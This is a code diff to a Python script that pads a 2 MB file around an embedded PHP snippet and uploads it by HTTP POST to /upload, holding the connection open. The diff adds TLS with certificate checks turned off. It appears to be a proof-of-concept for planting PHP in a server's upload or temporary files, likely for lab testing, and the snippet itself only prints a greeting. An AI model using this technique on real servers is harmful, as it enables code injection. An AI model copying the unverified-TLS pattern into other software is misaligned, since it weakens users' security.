@@ -3,6 +3,7 @@
 
 import argparse
 import socket
+import ssl
 import time
 from pathlib import Path
 
@@ -12,7 +13,6 @@ PAYLOAD_SIZE = 2 * 1024 * 1024
 PHP_OFFSET = 1 * 1024 * 1024
 PHP_SCRIPT = b'<?php echo "hello from payload"; ?>\n'
 FILL_BYTE = b"A"
-
 
 def create_payload(output_path: Path) -> None:
     if PHP_OFFSET + len(PHP_SCRIPT) > PAYLOAD_SIZE:
@@ -29,11 +29,32 @@ def create_payload(output_path: Path) -> None:
         raise RuntimeError("PHP script was not written at the requested offset")
 
 
-def send_payload(payload_path: Path, host: str, port: int, hold_seconds: float) -> None:
+def send_payload(
+    payload_path: Path,
+    host: str,
+    port: int,
+    hold_seconds: float,
+    use_tls: bool,
+) -> None:
     payload = payload_path.read_bytes()
 
     with socket.create_connection((host, port)) as connection:
-        connection.sendall(payload)
+        if use_tls:
+            tls_context = ssl._create_unverified_context()
+            connection = tls_context.wrap_socket(
+                connection,
+                server_hostname=host,
+            )
+            
+        headers = (
+            b"POST /upload HTTP/1.1\r\n"
+            b"Host: 192.168.0.2:8000\r\n"
+            b"Content-Type: application/xml\r\n"
+            b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
+            b"Connection: close\r\n"
+            b"\r\n"
+        )    
+        connection.sendall(headers + payload)
         print(f"Sent {len(payload)} bytes to {host}:{port}")
         if hold_seconds > 0:
             time.sleep(hold_seconds)
@@ -61,6 +82,11 @@ def main() -> None:
     parser.add_argument("--host", default=DEFAULT_HOST)
     parser.add_argument("--port", type=int, default=DEFAULT_PORT)
     parser.add_argument(
+        "--tls",
+        action="store_true",
+        help="wrap the TCP connection with TLS (accept the self-signed server certificate)",
+    )
+    parser.add_argument(
         "--hold",
         type=float,
         default=1.0,
@@ -69,7 +95,7 @@ def main() -> None:
     args = parser.parse_args()
 
     if args.file is not None:
-        send_payload(args.file, args.host, args.port, args.hold)
+        send_payload(args.file, args.host, args.port, args.hold, args.tls)
         return
 
     create_payload(args.output)
@@ -78,7 +104,7 @@ def main() -> None:
     print(f"PHP script length: {len(PHP_SCRIPT)} bytes")
 
     if args.send:
-        send_payload(args.output, args.host, args.port, args.hold)
+        send_payload(args.output, args.host, args.port, args.hold, args.tls)
 
 
 if __name__ == "__main__":
